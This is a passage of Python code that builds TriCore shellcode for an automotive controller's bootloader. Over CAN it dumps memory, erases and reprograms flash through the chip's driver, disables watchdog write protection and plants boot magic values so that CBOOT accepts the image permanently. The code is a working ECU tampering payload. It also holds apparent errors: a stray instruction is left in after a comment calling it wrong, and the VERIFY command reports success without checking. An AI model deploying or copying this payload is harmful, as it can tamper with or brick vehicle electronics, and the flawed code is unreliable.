    # Basically: address = bswap32(d12) >> 8 | (d13 & 0xFF) ... no, it's messy.
    #
    # Simpler approach: use a lookup/shift approach, or just extract byte by byte.
    # Actually: address = ADDR3<<24 | ADDR2<<16 | ADDR1<<8 | ADDR0
    # In d12 (LE): bits[15:8]=ADDR3, bits[23:16]=ADDR2, bits[31:24]=ADDR1
    # In d13 (LE): bits[7:0]=ADDR0
    #
    # Let me re-think the protocol to be LE-friendly.
    # Actually, let's just define the protocol as sending address in LE u32 at bytes[1..4]:
    # TX: [cmd, addr_b0, addr_b1, addr_b2, addr_b3, len_b0, len_b1, 0]
    # Then MODATAL = addr_b2<<24 | addr_b1<<16 | addr_b0<<8 | cmd
    # MODATAH = 0<<24 | len_b1<<16 | len_b0<<8 | addr_b3
    # Still messy. The cleanest is: address at bytes[1..4] little-endian.
    # MODATAL = [cmd, addr[7:0], addr[15:8], addr[23:16]]
    # MODATAH = [addr[31:24], len[7:0], len[15:8], 0]
    # addr = (d12 >> 8) & 0x00FFFFFF | (d13 & 0xFF) << 24
    # len  = (d13 >> 8) & 0xFFFF

    # d3 = d0 >> 8 (shift right 8 bits to remove cmd byte)
    # SH const9[5:0] = -8 as 6-bit two's complement = 0x38
    sc += _tc_sh(3, 0, 0x1F8)  # d3 = d0 >> 8
    # Actually SH does logical shift. const9[5:0] = -8 = 0x38. This gives d12 >> 8.
    # d3 = 0x00 | ADDR1 | ADDR2 | ADDR3  (shifted right, top byte zeroed)

    # d4 = d1 & 0xFF (high byte of address from MODATAH)
    sc += _tc_and_imm(4, 1, 0xFF)
    # d4 = d4 << 24
    sc += _tc_sh(4, 4, 24)

    # d3 = d3 | d4 → address
    sc += _tc_or_rr(3, 3, 4)
    # d3 = address (reconstructed)

    # d4 = (d1 >> 8) & 0xFFFF → length
    sc += _tc_sh(4, 1, 0x1F8)  # d4 = d1 >> 8
    sc += _tc_and_imm(4, 4, 0x1FF)  # only 9 bits from AND imm... need 16 bits
    # AND with const9 can only do 9-bit immediate. Use MOV.U + AND instead.
    sc = sc[:-4]
    sc += _tc_mov_u(5, 0xFFFF)  # d5 = 0x0000FFFF
    sc += _tc_and(4, 4, 5)      # d4 = d4 & 0xFFFF = length

    # Now: d3 = address, d4 = length
    # Convert d3 to address register for reading: a3 = d3
    sc += _tc_mov_a_d(3, 3)  # a3 = address to read from

    # Multi-frame read loop:
    # Send [0x42, seq, d0, d1, d2, d3, d4, d5] — 6 data bytes per frame
    # d14 = seq counter
    sc += _tc_mov_d(14, 0)

    read_loop = len(sc)
    # Check if d4 (remaining length) <= 0
    read_done_jeq = len(sc)
    sc += _tc_jeq(4, 0, 0)  # placeholder — patch to jump to main_loop

    # Read up to 6 bytes from [a3] into d0/d1
    # For simplicity, always read 2 words (8 bytes) and send 6
    sc += _tc_ld_w(0, 3, 0)   # d0 = *(a3+0) — bytes [3:0]
    sc += _tc_ld_w(1, 3, 4)   # d1 = *(a3+4) — bytes [7:4]

    # Build response MODATAL: [0x42, seq, data0, data1]
    # We want: byte0=0x42, byte1=d14 (seq), byte2..7=data
    # This is complex to assemble in registers. Simpler: write fields directly.
    #
    # Alternative approach: write raw d0/d1 to TX MODATAL/MODATAH,
    # then overwrite byte0/byte1 using byte-store instructions.
    # But TriCore byte stores to peripherals may not work well.
    #
    # Simplest: reorganize as [data0..data3] [data4, data5, seq, 0x42]
    # Actually for the protocol, let's put response ID first:
    # MODATAL = [0x42, seq, data[0], data[1]]
    # MODATAH = [data[2], data[3], data[4], data[5]]
    #
    # data[0..3] = d0 as LE bytes, data[4..5] = d1 low 2 bytes
    # MODATAL needs: 0x42 | (seq<<8) | (data[0]<<16) | (data[1]<<24)
    #              = 0x42 | (d14<<8) | ((d0 & 0xFF)<<16) | (((d0>>8)&0xFF)<<24)
    # This is getting very complex in pure TriCore asm. Let me simplify the protocol.
    #
    # REVISED READ PROTOCOL — raw data, minimal framing:
    # Response: [0x42, seq, B0, B1, B2, B3, B4, B5] — 6 bytes per frame
    # We just store the data words and then patch byte 0 and 1.
    #
    # Actually, even simpler: just stream 4 bytes per frame with simpler encoding:
    # [0x42, seq, 0, 0, D0, D1, D2, D3] — data in MODATAH as a clean u32
    # Then Python reads MODATAH directly. Much simpler in asm!

    # REVISED: [0x42, seq, len_remaining_hi, len_remaining_lo] in MODATAL
    #          [D0, D1, D2, D3] in MODATAH (4 bytes of flash data per frame)

    # Build MODATAL: 0x42 | (d14 << 8) | ((d4 & 0xFFFF) << 16)
    sc += _tc_mov_u(5, 0x0042)      # d5 = 0x42
    sc += _tc_sh(6, 14, 8)          # d6 = seq << 8
    sc += _tc_or_rr(5, 5, 6)        # d5 |= seq<<8
    sc += _tc_sh(6, 4, 16)          # d6 = remaining << 16
    sc += _tc_or_rr(5, 5, 6)        # d5 |= remaining<<16

    # Write MODATAL
    sc += _tc_st_w(9, MO_MODATAL, 5)
    # Write MODATAH = d0 (4 bytes of data)
    sc += _tc_st_w(9, MO_MODATAH, 0)

    # Trigger TX: MOCTR = SETTXRQ | SETNEWDAT
    sc += _tc_load32(5, MOCTR_SETTXRQ | MOCTR_SETNEWDAT)
    sc += _tc_st_w(9, MO_MOCTR, 5)

    # Poll TXPND
    tx_poll = len(sc)
    sc += _tc_ld_w(5, 9, MO_MOSTAT)
    sc += _tc_and_imm(6, 5, MOSTAT_TXPND)
    tx_poll_jz = len(sc)
    disp = (tx_poll - tx_poll_jz) // 2
    sc += _tc_jeq(6, 0, disp & 0x7FFF)

    # Clear TXPND
    sc += _tc_load32(5, MOCTR_RESTXPND)
    sc += _tc_st_w(9, MO_MOCTR, 5)

    # --- Inline WDT service (prevents reset during long reads) ---
    # Uses d5, d7, d15 as temps (free here), a6/a7 = WDT_CON0/CON1 (persistent)
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFF01
    sc += _tc_ld_w(15, 6, 0)             # d15 = WDT_CON0
    sc += _tc_ld_w(7, 7, 0)              # d7 = WDT_CON1
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFF01
    sc += _tc_or_imm(15, 15, 0xF0)       # d15 |= 0xF0
    sc += _tc_and_imm(7, 7, 0xC)         # d7 &= 0xC (HPW bits)
    sc += _tc_or_rr(15, 15, 7)           # d15 |= d7
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = password access
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)         # d5 = 0xFFFFFFF0
    sc += _tc_and(15, 15, 5)             # d15 &= 0xFFFFFFF0
    sc += _tc_or_imm(15, 15, 0x3)         # d15 |= 0x3 (LCK=1, ENDINIT=1)
    sc += _tc_st_w(6, 0, 15)             # WDT_CON0 = modify (service)
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC

    # Advance: a3 += 4, d4 -= 4, d14 += 1
    sc += _tc_lea(3, 3, 4)
    sc += _tc_addi(4, 4, -4 & 0xFFFF)  # ADDI const16 is sign-extended
    sc += _tc_add_sc(1)  # d15++ — wait, we're using d14 for seq, not d15
    # ADD d14, d14, #1 — need ADDI
    sc += _tc_addi(14, 14, 1)

    # Check if d4 > 0, loop back
    read_loop_jne = len(sc)
    disp = (read_loop - read_loop_jne) // 2
    sc += _tc_jne(4, 0, disp & 0x7FFF)

    # Patch read_done: when d4==0, jump to main_loop (patched at end)
    # For now mark position — we'll patch after main_loop is known.
    read_end = len(sc)
    # Jump to main_loop
    j_main_from_read = len(sc)
    sc += _tc_j(0)  # placeholder

    # Patch read_done JEQ to jump here (read_end)
    read_done_disp = (read_end - read_done_jeq) // 2
    sc[read_done_jeq:read_done_jeq + 4] = _tc_jeq(4, 0, read_done_disp)

    read_handler_end = len(sc)
    # Patch READ JNE
    read_skip_disp = (read_handler_end - read_jne_pos) // 2
    sc[read_jne_pos:read_jne_pos + 4] = _tc_jne(2, FM_CMD_READ, read_skip_disp)

    # --- Check ERASE (0x03) ---
    erase_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_ERASE, 0)  # placeholder

    # ERASE handler: extract address and length, call DRIVER_ERASE
    # TX: [03, addr_b0..b3, len_b0..b2] — 8 bytes
    # addr = (d0>>8)&0xFFFFFF | ((d1&0xFF)<<24)  (LE in CAN frame)
    # len  = (d1>>8)&0xFFFFFF

    # Extract address → d3, length → d4
    sc += _tc_sh(3, 0, 0x1F8)  # d3 = d0 >> 8 (lower 24 bits of addr)
    sc += _tc_and_imm(4, 1, 0xFF)
    sc += _tc_sh(4, 4, 24)
    sc += _tc_or_rr(3, 3, 4)  # d3 = address
    sc += _tc_sh(4, 1, 0x1F8)  # d4 = d1 >> 8 = length (24-bit)

    # Fill param struct (a10 = param base):
    #   +0x00 = 0, +0x04 = status(0), +0x08 = addr, +0x0C = len,
    #   +0x10 = 0, +0x14 = WDT callback, +0x18..+0x20 = 0
    sc += _tc_mov_d(5, 0)
    sc += _tc_st_w(10, 0x00, 5)           # +0x00 = 0
    sc += _tc_st_w(10, 0x04, 5)           # +0x04 = status = 0
    sc += _tc_st_w(10, 0x08, 3)           # +0x08 = flash address
    sc += _tc_st_w(10, 0x0C, 4)           # +0x0C = length
    sc += _tc_st_w(10, 0x10, 5)           # +0x10 = 0
    sc += _tc_load32(5, WDT_CALLBACK_ADDR)
    sc += _tc_st_w(10, 0x14, 5)           # +0x14 = WDT service callback
    sc += _tc_mov_d(5, 0)
    sc += _tc_st_w(10, 0x20, 5)           # +0x20 = write_pos = 0

    # Save a8/a9 to upper-ctx d-regs (preserved across CALL/RET)
    # a8 (RX MO) and a9 (TX MO) are NOT in any context — DRIVER may clobber
    sc += _tc_mov_d_a(14, 8)              # d14 = a8 (saved to CSA by CALL)
    sc += _tc_mov_d_a(15, 9)              # d15 = a9 (saved to CSA by CALL)

    # Save param_base (a10) and set a10 = valid stack pointer
    # a10 is upper ctx — CALL saves it. But callee uses a10 as SP!
    sc += _tc_mov_d_a(11, 10)             # d11 = param_base (saved to CSA)
    sc += _tc_load_addr(10, 0xD000E000)   # a10 = SP (DSPR stack)

    # a4 = param struct pointer (DRIVER's first argument)
    sc += _tc_mov_a_d(4, 11)              # a4 = param_base (from d11)

    # CALL DRIVER_ERASE (PC-relative disp24)
    # DRIVER init (called internally) handles ENDINIT/BTV/flash-register setup
    call_erase_pos = len(sc)
    call_erase_target = DRIVER_ERASE  # absolute address
    call_erase_pc = sc_base + call_erase_pos
    call_erase_disp = (call_erase_target - call_erase_pc) // 2
    sc += _tc_call(call_erase_disp)

    # After RET: d11=param_base, d14=a8, d15=a9 (restored from CSA)
    sc += _tc_mov_a_d(10, 11)             # a10 = param_base
    sc += _tc_mov_a_d(8, 14)              # a8 = RX MO base
    sc += _tc_mov_a_d(9, 15)              # a9 = TX MO base

    # Reload a6/a7 (WDT regs, may have been clobbered by DRIVER)
    sc += _tc_load_addr(6, 0xF0000020)    # a6 = WDT_CON0
    sc += _tc_load_addr(7, 0xF0000024)    # a7 = WDT_CON1

    # Read status from param struct
    sc += _tc_ld_w(0, 10, 0x04)           # d0 = status (u16 at +0x04)

    # Build response: [0x43, status, ...]
    sc += _tc_and_imm(0, 0, 0xFF)
    sc += _tc_sh(0, 0, 8)
    sc += _tc_or_imm(0, 0, 0x43)
    sc += _tc_mov_d(1, 0)
    erase_send_jmp = len(sc)
    sc += _tc_j(0)  # → send_response, patch later

    erase_end = len(sc)
    erase_skip_disp = (erase_end - erase_jne_pos) // 2
    sc[erase_jne_pos:erase_jne_pos + 4] = _tc_jne(2, FM_CMD_ERASE, erase_skip_disp)

    # --- Check WRITE_START (0x04) ---
    ws_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_WRITE_START, 0)  # placeholder

    # WRITE_START: set target address + length, reset buffer offset
    # TX: [04, addr_b0..b3, len_b0, len_b1, 0]
    sc += _tc_sh(3, 0, 0x1F8)
    sc += _tc_and_imm(4, 1, 0xFF)
    sc += _tc_sh(4, 4, 24)
    sc += _tc_or_rr(3, 3, 4)  # d3 = address
    sc += _tc_sh(4, 1, 0x1F8)
    sc += _tc_mov_u(5, 0xFFFF)
    sc += _tc_and(4, 4, 5)     # d4 = length (16-bit)

    # Store in persistent registers
    sc += _tc_mov_d_d(9, 3)   # d9 = target address
    sc += _tc_mov_d_d(10, 4)  # d10 = total length — wait, d10 conflicts with a10!
    # d-registers and a-registers are separate register files in TriCore.
    # d10 is fine, a10 is the param struct pointer — no conflict.
    sc += _tc_mov_d_d(10, 4)
    sc += _tc_mov_d(8, 0)     # d8 = buffer offset = 0

    # Send ACK: [0x44, 0x00, ...]
    sc += _tc_load32(0, 0x00000044)
    sc += _tc_mov_d(1, 0)
    ws_send_jmp = len(sc)
    sc += _tc_j(0)  # → send_response

    ws_end = len(sc)
    ws_skip = (ws_end - ws_jne_pos) // 2
    sc[ws_jne_pos:ws_jne_pos + 4] = _tc_jne(2, FM_CMD_WRITE_START, ws_skip)

    # --- Check WRITE_DATA (0x05) ---
    wd_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_WRITE_DATA, 0)

    # WRITE_DATA: [05, seq, D0, D1, D2, D3, D4, 0]
    # MODATAL = [05, seq, D0, D1]  → d12
    # MODATAH = [D2, D3, D4, 0]   → d13
    # Data bytes: D0..D4 = 5 bytes per frame (bytes 2-6 of CAN frame)
    # Actually 7 bytes: D0..D6 in bytes[2..7], but byte[7] may be pad.
    # Let's do 6 bytes: D0..D5 in bytes[2..7].
    # MODATAL >> 16 gives [D0, D1] in low 16 bits.
    # MODATAH & 0xFFFFFFFF gives [D2, D3, D4, pad].
    #
    # For simplicity, store 4 bytes from each CAN frame:
    # bytes[2..5] = MODATAL>>16 (2 bytes) | MODATAH&0xFFFF (2 bytes)
    # That's only 4 bytes. Let's do 7 bytes per frame as planned:
    # bytes[1..7] = all 7 data bytes after cmd.
    # MODATAL>>8 gives bytes[1..3] (seq, D0, D1) in 24 bits
    # Actually let's just write full words to buffer and sort it out.
    #
    # Simplest approach: store d12>>16 (2 bytes) and d13 (4 bytes) = 6 bytes total
    # Then Python sends data packed as: [05, seq, D0, D1, D2, D3, D4, D5]

    # Copy 6 data bytes (bytes[2..7]) to buffer at a12+d8:
    # Word 1 (bytes 2,3 from MODATAL high half): d3 = d12 >> 16 (only 16 bits of data)
    # Word 2 (bytes 4..7 = MODATAH): d13 (4 bytes)
    # Total per frame: 6 bytes. But misaligned stores are tricky.
    #
    # Even simpler: 4 bytes per frame from MODATAH only.
    # [05, seq, 0, 0, D0, D1, D2, D3] — Python packs 4 data bytes in MODATAH.
    # Then we just: *(buffer + d8) = d13; d8 += 4
    # This wastes CAN bandwidth but is trivially simple.

    # a3 = buffer_base + d8 (buffer + offset)
    # Avoid ADDSC.A (encoding issues) — use load + add + mov.a instead
    sc += _tc_load32(5, FM_BUFFER)   # d5 = buffer base address
    sc += _tc_add(5, 5, 8)           # d5 = buffer_base + d8
    sc += _tc_mov_a_d(3, 5)          # a3 = d5

    # Store d1 (MODATAH = 4 data bytes) to [a3]
    sc += _tc_st_w(3, 0, 1)

    # d8 += 4
    sc += _tc_addi(8, 8, 4)

    # Check if we need to ACK (every FM_WRITE_ACK_INTERVAL frames)
    # seq from MODATAL byte[1]: d3 = (d0 >> 8) & 0xFF
    sc += _tc_sh(3, 0, 0x1F8)  # d3 = d0 >> 8 (seq from MODATAL)
    sc += _tc_and_imm(3, 3, 0xFF)  # d3 = seq
    # Check (seq + 1) & (ACK_INTERVAL-1) == 0 (every 64th frame: seq=63,127,191,255)
    # This avoids const4 overflow: 63 doesn't fit in 4-bit, but 0 does.
    sc += _tc_addi(5, 3, 1)  # d5 = seq + 1
    sc += _tc_and_imm(5, 5, FM_WRITE_ACK_INTERVAL - 1)  # d5 = (seq+1) & 63
    wd_no_ack_pos = len(sc)
    sc += _tc_jne(5, 0, 0)  # placeholder → skip ACK (if NOT 0, skip)

    # Send ACK: [0x45, 0x00, ...]
    sc += _tc_load32(0, 0x00000045)
    sc += _tc_mov_d(1, 0)
    # Store to TX MO and trigger
    sc += _tc_st_w(9, MO_MODATAL, 0)
    sc += _tc_st_w(9, MO_MODATAH, 1)
    sc += _tc_load32(5, MOCTR_SETTXRQ | MOCTR_SETNEWDAT)
    sc += _tc_st_w(9, MO_MOCTR, 5)
    # Poll TXPND
    wd_txpoll = len(sc)
    sc += _tc_ld_w(5, 9, MO_MOSTAT)
    sc += _tc_and_imm(6, 5, MOSTAT_TXPND)
    disp = (wd_txpoll - len(sc)) // 2
    sc += _tc_jeq(6, 0, disp & 0x7FFF)
    sc += _tc_load32(5, MOCTR_RESTXPND)
    sc += _tc_st_w(9, MO_MOCTR, 5)

    wd_after_ack = len(sc)
    # Patch no-ack jump: skip ACK if (seq+1) & 63 != 0
    wd_no_ack_skip = (wd_after_ack - wd_no_ack_pos) // 2
    sc[wd_no_ack_pos:wd_no_ack_pos + 4] = _tc_jne(5, 0, wd_no_ack_skip)

    # Check if all data received: d8 >= d10
    # SUB d5, d8, d10; if d5 >= 0 (unsigned: d8 >= d10) → trigger write
    # Actually just check d8 == d10 (exact match expected)
    sc += _tc_sub(5, 10, 8)  # d5 = d10 - d8; if 0, all received
    wd_not_done_pos = len(sc)
    sc += _tc_jne(5, 0, 0)  # placeholder → main_loop

    # All data received — call DRIVER 0x334 (PROGRAM+VERIFY)
    # DRIVER 0x334 writes data from buffer to flash AND verifies read-back.
    # Param struct: +0x08=target addr, +0x0C=length, +0x10=source data ptr,
    #               +0x14=WDT callback

    # Fill param struct
    sc += _tc_mov_d(5, 0)
    sc += _tc_st_w(10, 0x00, 5)           # +0x00 = 0
    sc += _tc_st_w(10, 0x04, 5)           # +0x04 = status = 0
    sc += _tc_st_w(10, 0x08, 9)           # +0x08 = target address (d9)
    sc += _tc_st_w(10, 0x0C, 10)          # +0x0C = length (d10)
    sc += _tc_load32(5, FM_BUFFER)
    sc += _tc_st_w(10, 0x10, 5)           # +0x10 = source data pointer (buffer)
    sc += _tc_load32(5, WDT_CALLBACK_ADDR)
    sc += _tc_st_w(10, 0x14, 5)           # +0x14 = WDT callback
    sc += _tc_mov_d(5, 0)
    sc += _tc_st_w(10, 0x20, 5)           # +0x20 = 0

    # Save registers, set SP, set a4
    sc += _tc_mov_d_a(14, 8)
    sc += _tc_mov_d_a(15, 9)
    sc += _tc_mov_d_a(11, 10)
    sc += _tc_load_addr(10, 0xD000E000)
    sc += _tc_mov_a_d(4, 11)

    # CALL DRIVER program+verify (0x334)
    call_write_pos = len(sc)
    call_write_pc = sc_base + call_write_pos
    call_write_disp = (DRIVER_PROGVER - call_write_pc) // 2
    sc += _tc_call(call_write_disp)

    # Restore registers
    sc += _tc_mov_a_d(10, 11)
    sc += _tc_mov_a_d(8, 14)
    sc += _tc_mov_a_d(9, 15)
    sc += _tc_load_addr(6, 0xF0000020)
    sc += _tc_load_addr(7, 0xF0000024)

    # Read status from param struct
    sc += _tc_ld_w(0, 10, 0x04)

    # Build response: [0x45, status, 0x01 (done), ...]
    sc += _tc_and_imm(0, 0, 0xFF)
    sc += _tc_sh(0, 0, 8)
    sc += _tc_or_imm(0, 0, 0x45)
    sc += _tc_load32(5, 0x00010000)        # done flag at byte2
    sc += _tc_or_rr(0, 0, 5)
    sc += _tc_mov_d(1, 0)

    # Reset d8 for next write
    sc += _tc_mov_d(8, 0)

    wd_send_jmp = len(sc)
    sc += _tc_j(0)  # → send_response

    wd_not_done_end = len(sc)
    # Patch wd_not_done → jump to main_loop (patch later)
    wd_not_done_main = len(sc)
    sc += _tc_j(0)  # → main_loop, patch later

    wd_end = len(sc)
    wd_skip = (wd_end - wd_jne_pos) // 2
    sc[wd_jne_pos:wd_jne_pos + 4] = _tc_jne(2, FM_CMD_WRITE_DATA, wd_skip)

    # Patch wd_not_done JNE
    wd_not_done_skip = (wd_not_done_end - wd_not_done_pos) // 2
    sc[wd_not_done_pos:wd_not_done_pos + 4] = _tc_jne(5, 0, wd_not_done_skip)

    # --- Check VERIFY (0x06) ---
    ver_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_VERIFY, 0)

    # DRIVER 0x334 (called during WRITE) already programs AND verifies.
    # VERIFY command just returns success — real verification was done during write.
    sc += _tc_load32(0, 0x00000046)        # [0x46, status=0, ...]
    sc += _tc_mov_d(1, 0)
    ver_send_jmp = len(sc)
    sc += _tc_j(0)  # → send_response

    ver_end = len(sc)
    ver_skip = (ver_end - ver_jne_pos) // 2
    sc[ver_jne_pos:ver_jne_pos + 4] = _tc_jne(2, FM_CMD_VERIFY, ver_skip)

    # --- Check FLASH_RESET (0x07) ---
    # Resets flash state machine: writes 0xF0 + 0xF5 to flash command address,
    # then calls DRIVER_EXIT (0x300) which does the same + reads status.
    fr_jne_pos = len(sc)
    sc += _tc_jne(2, FM_CMD_FLASH_RESET, 0)  # placeholder

    # Save registers for CALL
    sc += _tc_mov_d_a(14, 8)              # d14 = a8
    sc += _tc_mov_d_a(15, 9)              # d15 = a9
    sc += _tc_mov_d_a(11, 10)             # d11 = param_base (a10)
    # Fill minimal param struct for DRIVER_EXIT
    sc += _tc_mov_d(5, 0)
    sc += _tc_st_w(10, 0x04, 5)           # +0x04 = status = 0
    sc += _tc_load_addr(10, 0xD000E000)   # a10 = SP
    sc += _tc_mov_a_d(4, 11)              # a4 = param struct
    # CALL DRIVER_EXIT (0x300)
    call_exit_pos = len(sc)
    call_exit_pc = sc_base + call_exit_pos
    call_exit_disp = (DRIVER_EXIT - call_exit_pc) // 2
    sc += _tc_call(call_exit_disp)
    # Restore
    sc += _tc_mov_a_d(10, 11)
    sc += _tc_mov_a_d(8, 14)
    sc += _tc_mov_a_d(9, 15)
    sc += _tc_load_addr(6, 0xF0000020)    # reload a6 = WDT_CON0
    sc += _tc_load_addr(7, 0xF0000024)    # reload a7 = WDT_CON1
    # Read status from param struct
    sc += _tc_ld_w(0, 10, 0x04)           # d0 = status
    sc += _tc_and_imm(0, 0, 0xFF)
    sc += _tc_sh(0, 0, 8)
    sc += _tc_or_imm(0, 0, 0x47)          # [0x47, status, ...]
    sc += _tc_mov_d(1, 0)
    fr_send_jmp = len(sc)
    sc += _tc_j(0)  # → send_response

    fr_end = len(sc)
    fr_skip = (fr_end - fr_jne_pos) // 2
    sc[fr_jne_pos:fr_jne_pos + 4] = _tc_jne(2, FM_CMD_FLASH_RESET, fr_skip)

    # --- Check RESET (0xFF) ---
    # d2 still has cmd byte. 0xFF doesn't fit in JNE const4 (only 4 bits = 0..15).
    # Use full compare: d5 = d2 - 0xFF; JNE d5, 0, skip
    sc += _tc_addi(5, 2, -0xFF & 0xFFFF)
    reset_jne_pos = len(sc)
    sc += _tc_jne(5, 0, 0)

    # RESET: Write DSPR warm boot magic for CBOOT, then Application Reset.
    #
    # CBOOT's cboot_check_asw_valid checks:
    #   d000dffc == 0x5353015B  (warm boot magic 1)
    #   d000dff8 == 0xACACFEA4  (complement)
    #   d000dff4 == 0x25A5A5A2  (programming complete → clears NVM error flags)
    #
    # The 0x25A5A5A2 path validates CRC, clears sticky NVM error bits (1-3,5-6),
    # writes NVM, then falls through to cold boot validate which succeeds
    # because fingerprints match and flags are now clean.
    # This makes the fix PERMANENT — survives power cycles.

    # Write warm boot magic to DSPR
    sc += _tc_load_addr(2, 0xD000DFF4)
    sc += _tc_load32(0, 0x25A5A5A2)         # programming complete magic
    sc += _tc_st_w(2, 0, 0)                 # *(d000dff4) = 0x25A5A5A2
    sc += _tc_load32(0, 0xACACFEA4)         # complement of 0x5353015B
    sc += _tc_st_w(2, 4, 0)                 # *(d000dff8) = 0xACACFEA4
    sc += _tc_load32(0, 0x5353015B)         # warm boot magic
    sc += _tc_st_w(2, 8, 0)                 # *(d000dffc) = 0x5353015B

    # Disable ENDINIT (required for SCU_RSTCON write)
    # Password Access: WDT_CON0 = (WDT_CON0 & 0xFFFFFF01) | 0xF0 | (WDT_CON1 & 0xC)
    sc += _tc_mov_u(5, 0xFF01)
    sc += _tc_addih(5, 5, 0xFFFF)           # d5 = 0xFFFFFF01
    sc += _tc_ld_w(15, 6, 0)               # d15 = WDT_CON0
    sc += _tc_ld_w(7, 7, 0)                # d7 = WDT_CON1
    sc += _tc_and(15, 15, 5)               # d15 &= 0xFFFFFF01
    sc += _tc_or_imm(15, 15, 0xF0)         # d15 |= 0xF0
    sc += _tc_and_imm(7, 7, 0xC)           # d7 &= 0xC
    sc += _tc_or_rr(15, 15, 7)             # d15 |= d7
    sc += _tc_st_w(6, 0, 15)               # WDT_CON0 = password access
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC
    # Modify: ENDINIT=0
    sc += _tc_mov_u(5, 0xFFF0)
    sc += _tc_addih(5, 5, 0xFFFF)           # d5 = 0xFFFFFFF0
    sc += _tc_and(15, 15, 5)               # d15 &= 0xFFFFFFF0
    sc += _tc_or_imm(15, 15, 0x2)          # d15 |= 0x2 (LCK=1, ENDINIT=0)
    sc += _tc_st_w(6, 0, 15)               # WDT_CON0 = modify
    sc += bytes([0x0D, 0x00, 0xC0, 0x04])  # ISYNC

    # Application Reset via SCU_RSTCON (preserves DSPR!)
    # TC1766 SCU_RSTCON bits[1:0]: 01=Application Reset, 10=System Reset
    sc += _tc_load_addr(2, SCU_RSTCON)
    sc += _tc_load32(0, 0x01)              # Application Reset (NOT System Reset!)
    sc += _tc_st_w(2, 0, 0)
    # Spin (should not reach here)
    sc += _tc_j16(0xFE)  # infinite loop (J -2)

    reset_end = len(sc)
    reset_skip = (reset_end - reset_jne_pos) // 2
    sc[reset_jne_pos:reset_jne_pos + 4] = _tc_jne(5, 0, reset_skip)

    # Unknown command → just loop back
    unknown_j = len(sc)
    sc += _tc_j(0)  # → main_loop, patch later

    # ===================================================================
    # SEND_RESPONSE subroutine (inline — d0=MODATAL, d1=MODATAH)
    # ===================================================================
    send_response = len(sc)

    sc += _tc_st_w(9, MO_MODATAL, 0)
    sc += _tc_st_w(9, MO_MODATAH, 1)
    sc += _tc_load32(5, MOCTR_SETTXRQ | MOCTR_SETNEWDAT)
    sc += _tc_st_w(9, MO_MOCTR, 5)

    # Poll TXPND
    sr_poll = len(sc)
    sc += _tc_ld_w(5, 9, MO_MOSTAT)
    sc += _tc_and_imm(6, 5, MOSTAT_TXPND)
    disp = (sr_poll - len(sc)) // 2
    sc += _tc_jeq(6, 0, disp & 0x7FFF)

    # Clear TXPND
    sc += _tc_load32(5, MOCTR_RESTXPND)
    sc += _tc_st_w(9, MO_MOCTR, 5)

    # Jump to main_loop
    sr_j_main = len(sc)
    disp = (main_loop - sr_j_main) // 2
    sc += _tc_j(disp)

    # ===================================================================
    # TRAP HANDLER — catch traps and send class+TIN via CAN
    # ===================================================================
    # Align to 256 bytes for BTV requirement
    trap_align = ((len(sc) + 0xFF) & ~0xFF) - len(sc)
    sc += bytes(trap_align)  # pad with zeros (NOP-like)

    trap_table_offset = len(sc)
    TRAP_TABLE_ADDR = sc_base + trap_table_offset

    # Common trap handler (placed BEFORE the vector table entries)
    # On trap entry: d15 = TIN, a9 = TX MO base (upper ctx preserved)
    # We jump here from each slot, with d14 = trap class
    common_handler_offset = len(sc)
    COMMON_HANDLER_ADDR = sc_base + common_handler_offset
    # Send: d0 = A[11] (trap PC = faulting instruction), d1 = (class << 8) | TIN
    sc += _tc_mov_d_a(0, 11)          # d0 = A[11] (trap return address)
    sc += _tc_sh(14, 14, 8)           # d14 = class << 8
    sc += _tc_or_rr(1, 14, 15)        # d1 = (class << 8) | TIN
    sc += _tc_st_w(9, MO_MODATAL, 0)
    sc += _tc_st_w(9, MO_MODATAH, 1)
    sc += _tc_load32(5, 0x08000000)
    sc += _tc_st_w(9, 0, 5)           # MOFCR = DLC=8
    sc += _tc_load32(5, MOCTR_SETTXRQ | MOCTR_SETNEWDAT | MOCTR_SETMSGVAL)
    sc += _tc_st_w(9, MO_MOCTR, 5)
    sc += _tc_j16(0xFE)               # spin forever

    # Now build the vector table — must be 256-byte aligned
    # Re-align after common handler
    trap_align2 = ((len(sc) + 0xFF) & ~0xFF) - len(sc)
    sc += bytes(trap_align2)

    trap_table_offset = len(sc)
    TRAP_TABLE_ADDR = sc_base + trap_table_offset

    # 8 trap class slots, each 0x20 (32) bytes
    for trap_class in range(8):
        slot_start = len(sc)
        # MOV d14, #class (16-bit SRC: 0x82, (const4 << 4) | reg)
        sc += _tc_mov_d(14, trap_class)   # 2 bytes
        # J to common handler
        j_disp = (common_handler_offset - len(sc)) // 2
        sc += _tc_j(j_disp)              # 4 bytes
        # Pad to 0x20 bytes
        pad = 0x20 - (len(sc) - slot_start)
        sc += bytes(pad)

    log.info(f"Trap table at offset 0x{trap_table_offset:X} "
             f"(addr 0x{TRAP_TABLE_ADDR:X}), "
             f"common handler at 0x{COMMON_HANDLER_ADDR:X}")

    # Patch BTV placeholder with actual TRAP_TABLE_ADDR
    sc[btv_load_pos:btv_load_pos + 8] = _tc_load32(5, TRAP_TABLE_ADDR)

    # ===================================================================
    # PATCH all jumps to send_response and main_loop
    # ===================================================================

    def _patch_j32(pos, target):
        disp = (target - pos) // 2
        sc[pos:pos + 4] = _tc_j(disp)

    # Jumps to send_response
    _patch_j32(send_resp_jmp, send_response)
    _patch_j32(erase_send_jmp, send_response)
    _patch_j32(ws_send_jmp, send_response)
    _patch_j32(wd_send_jmp, send_response)
    _patch_j32(ver_send_jmp, send_response)
    _patch_j32(fr_send_jmp, send_response)

    # Jumps to main_loop
    _patch_j32(j_main_from_read, main_loop)
    _patch_j32(wd_not_done_main, main_loop)
    _patch_j32(unknown_j, main_loop)

    log.info(f"Flash Manager shellcode: {len(sc)} bytes")
    return bytes(sc)


# ---------------------------------------------------------------------------
